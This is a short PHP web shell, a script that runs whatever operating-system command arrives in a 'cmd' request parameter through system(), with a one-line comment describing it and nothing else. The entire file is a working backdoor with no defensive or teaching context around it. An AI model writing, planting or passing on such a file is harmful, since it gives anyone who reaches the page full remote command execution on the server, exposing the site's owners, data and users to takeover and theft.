<!-- simple shell command execute with cmd param -->

<?php

if (isset($_REQUEST['cmd'])) {
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
} else {
    echo "Please provide cmd parameter";
}

?>